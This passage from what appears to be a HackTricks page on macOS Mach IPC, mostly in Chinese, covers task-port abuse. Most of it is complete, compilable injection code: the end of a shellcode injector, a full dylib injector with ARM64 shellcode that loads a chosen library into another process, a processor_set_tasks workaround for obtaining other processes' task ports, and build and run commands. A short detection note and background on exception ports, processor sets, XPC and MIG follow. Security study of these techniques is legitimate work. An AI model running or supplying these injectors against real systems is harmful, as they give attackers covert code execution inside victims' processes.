kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> 要使其在 iOS 上工作，您需要权限 `dynamic-codesigning` 以便能够创建可写的内存可执行文件。

### 通过任务端口在线程中注入 Dylib

在 macOS 中，**线程** 可以通过 **Mach** 或使用 **posix `pthread` api** 进行操作。我们在之前的注入中生成的线程是使用 Mach api 生成的，因此 **它不符合 posix 标准**。

能够 **注入一个简单的 shellcode** 来执行命令是因为它 **不需要与 posix** 兼容的 api，只需与 Mach 兼容即可。**更复杂的注入** 将需要 **线程** 也 **符合 posix 标准**。

因此，为了 **改进线程**，它应该调用 **`pthread_create_from_mach_thread`**，这将 **创建一个有效的 pthread**。然后，这个新的 pthread 可以 **调用 dlopen** 从系统中 **加载一个 dylib**，因此不必编写新的 shellcode 来执行不同的操作，而是可以加载自定义库。

您可以在以下位置找到 **示例 dylibs**（例如，生成日志的那个，然后您可以监听它）：

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 线程劫持通过任务端口 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

在此技术中，进程的一个线程被劫持：

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### 任务端口注入检测

当调用 `task_for_pid` 或 `thread_create_*` 时，会在内核的任务结构中递增一个计数器，该结构可以通过用户模式调用 task_info(task, TASK_EXTMOD_INFO, ...)

## 异常端口

当线程中发生异常时，该异常会发送到线程的指定异常端口。如果线程不处理它，则会发送到任务异常端口。如果任务不处理它，则会发送到由 launchd 管理的主机端口（在这里会被确认）。这被称为异常分类。

请注意，通常如果未正确处理，报告最终会由 ReportCrash 守护进程处理。然而，任务中的另一个线程可以管理该异常，这就是崩溃报告工具如 `PLCreashReporter` 所做的。

## 其他对象

### 时钟

任何用户都可以访问有关时钟的信息，但要设置时间或修改其他设置，必须是 root。

为了获取信息，可以调用 `clock` 子系统中的函数，如：`clock_get_time`、`clock_get_attributtes` 或 `clock_alarm`\
为了修改值，可以使用 `clock_priv` 子系统中的函数，如 `clock_set_time` 和 `clock_set_attributes`

### 处理器和处理器集

处理器 API 允许通过调用函数如 `processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` 来控制单个逻辑处理器...

此外，**处理器集** API 提供了一种将多个处理器分组的方法。可以通过调用 **`processor_set_default`** 来检索默认处理器集。\
以下是一些与处理器集交互的有趣 API：

- `processor_set_statistics`
- `processor_set_tasks`: 返回处理器集中所有任务的发送权限数组
- `processor_set_threads`: 返回处理器集中所有线程的发送权限数组
- `processor_set_stack_usage`
- `processor_set_info`

正如在 [**这篇文章**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) 中提到的，过去这允许绕过之前提到的保护，以获取其他进程中的任务端口，通过调用 **`processor_set_tasks`** 并在每个进程中获取主机端口。\
如今，您需要 root 权限才能使用该功能，并且这受到保护，因此您只能在未受保护的进程上获取这些端口。

您可以尝试以下代码：

<details>

<summary><strong>processor_set_tasks 代码</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
